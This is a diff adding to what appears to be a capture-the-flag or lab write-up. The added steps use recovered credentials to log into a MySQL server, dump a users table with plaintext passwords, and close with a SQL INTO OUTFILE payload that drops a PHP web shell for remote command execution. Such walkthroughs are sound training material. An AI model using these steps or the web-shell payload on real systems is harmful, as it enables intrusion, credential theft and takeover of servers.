@@ -41,3 +41,47 @@ if($connection == false){
 
 Username: `admin`  
 Password: `!123SecureAdminDashboard321!`
+
+Using these credentials, we can access the database in `192.168.100.1` using the command `mysql -h 192.168.100.1 -u admin -p`.
+
+We can enumerate databases.
+```
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| DashboardDB        |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use DashboardDB
+Database changed
+mysql> show tables;
++-----------------------+
+| Tables_in_DashboardDB |
++-----------------------+
+| users                 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----------+-----------------+
+| username | password        |
++----------+-----------------+
+| admin    | DBManagerLogin! |
+| gurag    | AAAA            |
++----------+-----------------+
+2 rows in set (0.00 sec)
+```
+
+Now we have more creds. 
+
+Username: `gurag`  
+Password: `AAAA`
+
+We can exploit MySQL database to gain RCE using `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`.
+
